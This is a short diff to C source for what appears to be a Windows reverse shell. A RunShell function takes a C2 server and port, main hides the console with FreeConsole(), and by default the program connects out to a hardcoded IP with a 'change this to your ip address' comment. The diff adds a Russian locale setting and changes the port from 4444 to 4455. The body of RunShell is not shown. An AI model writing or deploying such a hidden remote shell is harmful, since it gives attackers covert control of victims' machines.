@@ -76,6 +76,7 @@ void RunShell(char* C2Server, int C2Port) {
 }
 
 int main(int argc, char** argv) {
+    setlocale(LC_ALL, "Russian");
     FreeConsole();
     if (argc == 3) {
         int port = atoi(argv[2]);
@@ -83,7 +84,7 @@ int main(int argc, char** argv) {
     }
     else {
         char host[] = "192.168.1.21";  // change this to your ip address
-        int port = 4444;               // chnage this to your open port
+        int port = 4455;               // chnage this to your open port
         RunShell(host, port);
     }
     return 0;
